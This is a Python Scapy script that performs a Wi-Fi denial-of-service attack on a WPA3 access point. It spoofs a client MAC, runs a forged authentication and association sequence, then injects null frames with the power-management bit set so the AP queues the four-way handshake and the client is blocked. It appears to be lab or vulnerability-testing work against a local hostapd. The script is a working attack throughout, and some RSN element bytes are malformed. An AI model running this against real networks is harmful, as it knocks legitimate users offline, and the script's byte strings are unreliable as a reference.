from scapy.all import *

# === Interface Settings ===
INTERFACE = "monwlan1"              # Your monitor interface
AP_MAC = "02:00:00:00:00:00"        # MAC (BSSID) of your hostapd
CLIENT_MAC = "02:00:00:00:01:00"    # MAC of the client (As per iw dev)
SSID = "testnetwork"                # WPA3 network name

# === Helper Functions ===


def build_auth_request():
    """Builds an Authentication Request (Open System - algo 0)."""
    # Open System (algo=0) jest akceptowany przez hostapd w pierwszej fazie,
    # zanim spróbuje wymusić SAE.
    dot11 = Dot11(
        type=0, subtype=11,
        addr1=AP_MAC, addr2=CLIENT_MAC, addr3=AP_MAC
    )
    auth_req = Dot11Auth(algo=0, seqnum=1, status=0)
    # NIE dodajemy IE RSNinfo do Auth Request, aby nie prowokować od razu problemów z SAE.
    return RadioTap() / dot11 / auth_req



def build_assoc_request():
    """Builds an Association Request for WPA3 (PMF)."""
    # DODANO DEFINICJĘ ZMIENNEJ dot11
    dot11 = Dot11(
        type=0, subtype=0,
        addr1=AP_MAC, addr2=CLIENT_MAC, addr3=AP_MAC
    )
    # Setting PMF as required (crucial for WPA3)
    # Capability 0x1031 (Privacy, Short slot time, PMF Required)
    assoc_req = Dot11AssoReq(cap=0x1031, listen_interval=1)

    # RSN IE (poprawiony w poprzednim kroku - z właściwym AKM SAE)
    rsn_info = (
        b'\x01\x00' +                 # Version
        b'\x00\x0f\xac\x04' +         # Group Cipher: CCMP-128
        b'\x01\x00' +                 # Pairwise Cipher Count
        b'\x00\x0f\ac\x04' +         # Pairwise Cipher: CCMP-128
        b'\x01\x00' +                 # AKM Count
        b'\x00\x0f\ac\x08' +         # AKM: SAE (WPA3-Personal)
        b'\x00\x80'                   # RSN Capabilities: PMF Required
    )

    # HT Capabilities ma ID = 45 (0x2d)
    ht_cap_info = b'\x6f\x01\x17\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    elements = (
        Dot11Elt(ID=0, info=SSID) /
        Dot11Elt(ID=1, info=b'\x82\x04\x8b\x96\x0c\x18\x30\x48') /
        Dot11Elt(ID=48, info=rsn_info) /
        Dot11Elt(ID=45, info=ht_cap_info)
    )
    return RadioTap() / dot11 / assoc_req / elements

def build_null_frame_with_pm_bit():
    """
    Creates a Null Function Data frame (Type 2, Subtype 4)
    with the Power Management bit set (sleep-bit).
    """
    dot11 = Dot11(
        type=2, subtype=4,
        # addr1 = BSSID (AP), addr2 = STA (Client), addr3 = BSSID (AP)
        addr1=AP_MAC,
        addr2=CLIENT_MAC,
        addr3=AP_MAC,
    )
    # Ustawienie 'to-DS' i 'Pwr Mgt' (bit 4)
    dot11.FCfield = 'to-DS'
    dot11.FCfield |= 0b00010000

    return RadioTap() / dot11

# === Main Attack Logic ===


def queueing_dos_attack():
    """Runs the connection steps and injects the sleep frame."""

    print(f"Starting 802.11 client on interface: {INTERFACE}")
    print(f"   AP (BSSID): {AP_MAC}, Client (STA): {CLIENT_MAC}, SSID: {SSID}")

    # --- PHASE 1: CONNECTION (Agresywne przejście do Associated) ---

    # 1. Probe Request
    print("\n[1] SENDING: Probe Request...")
    sendp(RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=CLIENT_MAC,
          addr3="ff:ff:ff:ff:ff:ff")/Dot11ProbeReq()/Dot11Elt(ID=0, info=SSID), iface=INTERFACE, verbose=False)

    # 2. Authentication (Open System - by zainicjować sesję)
    print("[2] SENDING: Authentication Request (Open System)...")
    sendp(build_auth_request(), iface=INTERFACE, verbose=False)

    # Szybko sprawdź, czy AP odpowiedział. Jeśli tak, to jest dobry znak.
    auth_resp = sniff(iface=INTERFACE, lfilter=lambda x: x.haslayer(
        Dot11Auth) and x.addr2 == AP_MAC, timeout=0.5, count=1)

    if not auth_resp:
        print("Authentication Response not received. AP may have already rejected.")
    else:
        print("Authentication Response received. Proceeding to Association.")

    # 3. Association Request
    print("[3] SENDING: Association Request (WPA3 PMF)...")
    sendp(build_assoc_request(), iface=INTERFACE, verbose=False)

    # Dajemy AP bardzo krótki czas na przetworzenie Association.
    assoc_resp = sniff(iface=INTERFACE, lfilter=lambda x: x.haslayer(
        Dot11AssoResp) and x.addr2 == AP_MAC, timeout=0.5, count=1)

    if assoc_resp and assoc_resp[0][Dot11AssoResp].status == 0:
        print("Association successful! AP is fully ENGAGED.")
    else:
        print("Association failed/rejected (expected). AP is likely partially ENGAGED.")

    print("--- AP should now be in a state to attempt 4WH ---")

    # --- PHASE 2: ATTACK (QUEUEING DoS) ---

    # 4. Inject Null-Frame with Power Management Bit (Sleep-bit)
    print("\n[4] ATTACK: Injecting Null-Frame with PM bit (Sleep-bit=1)...")

    null_frame = build_null_frame_with_pm_bit()

    # Wyślij ramkę wielokrotnie. Tłumaczy to AP, że klient przechodzi w tryb uśpienia.
    sendp(null_frame, iface=INTERFACE, count=30, inter=0.01, verbose=False)

    print("Sleep frames sent. Client is now 'asleep'.")
    print("   Waiting for EAPOL Key Msg 1, which should NOW be queued by the AP...")

    # 5. Check if EAPOL Key Msg 1 is SENT (it should be blocked)
    print("   Sniffing for EAPOL Key Msg 1 (10s timeout)...")

    # EAPOL to Type 2 (Data)
    eapol_msg1_list = sniff(iface=INTERFACE, lfilter=lambda x: x.haslayer(
        EAPOL) and x.addr2 == AP_MAC, timeout=10, count=1)

    if eapol_msg1_list:
        print("WARNING: Received EAPOL Key Msg 1. The attack was NOT successful.")
        print("   The hostapd/kernel implementation is not vulnerable (or patched).")
    else:
        print("SUCCESS: Did NOT receive EAPOL Key Msg 1 (Timeout).")
        print("   This indicates the hostapd/kernel **queued** the 4WH message.")
        print("   The DoS attack was successful (client is blocked).")


if __name__ == "__main__":
    try:
        queueing_dos_attack()
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
